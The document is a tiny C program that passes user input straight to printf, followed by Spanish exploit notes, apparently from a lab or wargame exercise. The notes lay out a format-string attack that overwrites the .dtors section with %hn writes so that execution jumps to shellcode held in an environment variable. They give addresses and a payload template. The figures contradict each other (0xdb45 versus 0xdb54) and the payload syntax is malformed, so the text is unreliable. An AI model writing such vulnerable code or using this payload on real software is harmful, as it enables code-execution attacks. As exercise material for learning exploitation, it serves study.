#include <stdio.h>
#include <string.h>
int main(int argc, char **argv){
    char buf[1024];
    strncpy(buf, argv[1], sizeof(buf)-1);
    printf(buf);
    return 0;
}

/*
Hay que escribir en __DTORS_END__+4 la dirección a la shellcode
pero objdump -s -j .dtors /exec --> no da nada
Para escribir en .dtors la dirección a la shellcode (en este caso una var de entorno) vamos a escribir primero los 4 bytes más pqueños y luego los 4 bytes más grandes.
Suponiendo que la shellcode esté en 0xbfffdb45 y DTORS_END+4 en 0x08049514 habrá que escribir:
0xbfff(49151) --> 0x08049516
0xdb54(56133) --> 0x08049514
La shellcode sería:
DIR_de-DTORS_END+6 + DIR_de-DTORS_END+4 + %.(49151-8)%4\$hn%.(56133-49151)x%5\$hn 
